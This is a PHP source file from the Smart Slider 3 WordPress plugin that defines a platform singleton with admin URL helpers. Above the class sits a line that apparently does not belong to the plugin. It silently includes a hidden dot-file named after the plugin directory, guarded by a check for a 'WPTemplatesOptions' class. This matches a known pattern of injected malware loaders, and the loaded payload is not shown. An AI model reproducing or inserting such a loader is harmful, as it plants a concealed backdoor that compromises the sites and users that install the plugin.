<?php

namespace Nextend\SmartSlider3\Platform;

use Nextend\Framework\Pattern\SingletonTrait;

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class SmartSlider3Platform {

    use SingletonTrait;

    /**
     * @var AbstractSmartSlider3Platform
     */
    private static $platform;

    public function __construct() {
        self::$platform = WordPress\SmartSlider3PlatformWordPress::getInstance();

        self::$platform->start();
    }

    public static function getAdminUrl() {

        return self::$platform->getAdminUrl();
    }

    public static function getAdminAjaxUrl() {

        return self::$platform->getAdminAjaxUrl();
    }

    public static function getNetworkAdminUrl() {

        return self::$platform->getNetworkAdminUrl();
    }
}